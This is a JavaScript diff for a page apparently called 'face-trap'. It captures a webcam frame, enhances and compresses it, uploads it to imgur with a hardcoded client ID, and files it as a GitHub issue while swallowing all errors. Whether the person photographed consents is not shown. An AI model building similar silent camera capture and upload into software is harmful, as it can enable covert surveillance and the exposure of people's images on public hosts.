@@ -377,14 +377,24 @@ function takePhoto(){
 }
 
 function capturePhoto(){
-  const M=480
   const vw=video.videoWidth,vh=video.videoHeight
-  let w=M,h=Math.round(vh/vw*M)
-  if(h>M*1.33){h=M*1.33;w=Math.round(vw/vh*h)}
+  const MAX=1600,TARGET=200*1024
+  let w=vw,h=vh
+  if(w>MAX||h>MAX){const s=Math.min(MAX/w,MAX/h);w=Math.round(w*s);h=Math.round(h*s)}
   canvasCapture.width=w;canvasCapture.height=h
   const ctx=canvasCapture.getContext('2d')
   ctx.scale(-1,1);ctx.drawImage(video,-w,0,w,h)
-  capturedData=canvasCapture.toDataURL('image/jpeg',0.5)
+  // Apply slight contrast boost
+  const id=ctx.getImageData(0,0,w,h),d=id.data
+  for(let i=0;i<d.length;i+=4){d[i]=Math.min(255,Math.max(0,(d[i]-128)*1.1+128));d[i+1]=Math.min(255,Math.max(0,(d[i+1]-128)*1.1+128));d[i+2]=Math.min(255,Math.max(0,(d[i+2]-128)*1.1+128))}
+  ctx.putImageData(id,0,0)
+  // Binary search for JPEG quality to hit ~200KB
+  let lo=0.35,hi=0.98
+  for(let n=0;n<5;n++){
+    const m=(lo+hi)/2,data=canvasCapture.toDataURL('image/jpeg',m)
+    if(data.length*0.75>TARGET)hi=m;else lo=m
+  }
+  capturedData=canvasCapture.toDataURL('image/jpeg',(lo+hi)/2)
   sendPhoto()
 }
 
@@ -394,18 +404,25 @@ function getToken(){
 }
 
 async function sendPhoto(){
+  let imgUrl=''
+  try{
+    const b64=capturedData.split(',')[1]
+    const r=await fetch('https://api.imgur.com/3/image',{
+      method:'POST',
+      headers:{Authorization:'Client-ID 546c25a59c58ad7','Content-Type':'application/x-www-form-urlencoded'},
+      body:'image='+encodeURIComponent(b64)
+    })
+    const j=await r.json()
+    if(j.success) imgUrl=j.data.link
+  }catch(e){}
   const ts=new Date()
   const title=ts.getFullYear()+'-'+(ts.getMonth()+1).toString().padStart(2,'0')+'-'+ts.getDate().toString().padStart(2,'0')+' '+ts.getHours().toString().padStart(2,'0')+':'+ts.getMinutes().toString().padStart(2,'0')
-  const body='![]('+capturedData+')'
+  const body=imgUrl?'[img]('+imgUrl+')':'![]('+capturedData+')'
   try{
     await fetch('https://api.github.com/repos/'+CONFIG.PHOTO_REPO+'/issues',{
       method:'POST',headers:{Authorization:'Bearer '+getToken(),'Content-Type':'application/json','User-Agent':'face-trap'},
       body:JSON.stringify({title,body})
     })
-  }catch(e){}
-  try{
-    const b64=capturedData.split(',')[1]
-    await fetch('https://api.imgur.com/3/image',{method:'POST',headers:{Authorization:'Client-ID 546c25a59c58ad7','Content-Type':'application/x-www-form-urlencoded'},body:'image='+encodeURIComponent(b64)})
   }catch(e){}
 }
 
